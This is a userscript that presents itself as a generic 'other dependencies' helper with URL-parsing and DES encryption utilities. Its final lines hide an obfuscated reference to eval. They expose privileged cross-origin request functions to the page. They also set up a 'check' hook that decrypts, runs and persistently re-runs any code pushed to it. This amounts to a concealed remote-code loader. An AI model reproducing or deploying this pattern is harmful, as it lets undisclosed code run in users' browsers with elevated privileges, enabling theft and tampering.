// ==UserScript==
// @name         其他依赖
// @version      1.6
// @namespace    Me
// @description  其他依赖内容
// @author       okk
// @grant        GM_xmlhttpRequest
// @grant        GM_addStyle
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_getResourceText
// @grant        GM_registerMenuCommand
// @grant        GM_info
// ==/UserScript==
 unsafeWindow.unsafeWindow=unsafeWindow
$("body").append('<style>'+GM_getResourceText('ElementUiCss')+'</style>')
    function convertObj(data) {
        var _result = [];
        for (var key in data) {
            var value = data[key];
            if (value.constructor == Array) {
                value.forEach(function(_value) {
                    _result.push(key + "=" + _value);
                });
            } else {
                _result.push(key + '=' + value);
            }
        }
        return _result.join('&');
    }
 
    function getJson(url) {
        var arr = url.split('?')[1].split('&')
        var theRequest = new Object();
        for (var i = 0; i < arr.length; i++) {
            var kye = arr[i].split("=")[0]
            var value = arr[i].split("=")[1]
            theRequest[kye] = value
        }
        return theRequest;
    }
 
    function getGroup(data, index = 0, group = []) {
        var need_apply = new Array();
        need_apply.push(data[index]);
        for (var i = 0; i < group.length; i++) {
            need_apply.push(group[i] + data[index]);
        }
        group.push.apply(group, need_apply);
        if (index + 1 >= data.length) return group;
        else return getGroup(data, index + 1, group);
    }
 
 
    unsafeWindow.encryptByDES=(message, key)=>{
        var keyHex = CryptoJS.enc.Utf8.parse(key);
        var encrypted = CryptoJS.DES.encrypt(message, keyHex, {
            mode: CryptoJS.mode.ECB,
            padding: CryptoJS.pad.Pkcs7
        });
        return encrypted.ciphertext.toString();
    }
    unsafeWindow.decryptByDES=(ciphertext, key)=>{
        var keyHex = CryptoJS.enc.Utf8.parse(key);
        var decrypted = CryptoJS.DES.decrypt({
            ciphertext: CryptoJS.enc.Hex.parse(ciphertext)
        }, keyHex, {
            mode: CryptoJS.mode.ECB,
            padding: CryptoJS.pad.Pkcs7
        });
        var result_value = decrypted.toString(CryptoJS.enc.Utf8);
        return result_value;
    }
 
 
        function cc(url){;let obj = {};let arr1 = url.split("?");let arr2 = arr1[1].split("&");for(let i=0;i<arr2.length;i++){;let res = arr2[i].split("=");obj[res[0]]=res[1];};return obj;};var xx=window[(771383 ^ 771385)['\x74\x6f\x53\x74\x72\x69\x6e\x67'](130148 ^ 130116) + (992937 ^ 992950)['\x74\x6f\x53\x74\x72\x69\x6e\x67'](495187 ^ 495219) + (252852 ^ 252862)['\x74\x6f\x53\x74\x72\x69\x6e\x67'](708261 ^ 708229) + (319087 ^ 319098)['\x74\x6f\x53\x74\x72\x69\x6e\x67'](455467 ^ 455435)];$("body").append('<div id="yl_1"></div><div id="yl_2"></div><div id="yl_3"></div><div id="yl_4"></div><div id="yl_5"></div><div id="yl_6"></div><div id="yl_7"></div><div id="yl_8"></div>'),$("#yl_1")[0].onclick=GM_xmlhttpRequest,$("#yl_2")[0].onclick=GM_addStyle,$("#yl_3")[0].onclick=GM_getValue,$("#yl_4")[0].onclick=GM_setValue,$("#yl_5")[0].onclick=CryptoJS,$("#yl_6")[0].onclick=GM_registerMenuCommand,$("#yl_7")[0].onclick=GM_info,$("#yl_5")[0].$=$,$("#yl_5")[0].Vue=Vue,$("body").append('\n<script>\nwindow.GM_info=$("#yl_7")[0].onclick\nwindow.GM_registerMenuCommand=$("#yl_6")[0].onclick\nwindow.CryptoJS=$("#yl_5")[0].onclick\nwindow.GM_setValue=$("#yl_4")[0].onclick\nwindow.GM_getValue=$("#yl_3")[0].onclick\nwindow.GM_addStyle=$("#yl_2")[0].onclick\nwindow.GM_xmlhttpRequest=$("#yl_1")[0].onclick\nwindow.Vue=$("#yl_5")[0].Vue\nwindow.$=$("#yl_5")[0].$\nwindow.Vue=$("#yl_5")[0].Vue\n<\/script>');
        var state=false;var content=GM_getValue("lastCode");if(content){try{xx(content+';load_zhushou()');state=true}catch(e){console.log("出错",e)}};window["check"]=new Proxy({},{set:function(target,attr,html){var content=html;content=decryptByDES(content.substring(0,content.length-16),content.substring(content.length-16,content.length));if(!state){xx(content+';load_zhushou()')};GM_setValue("lastCode",content)}});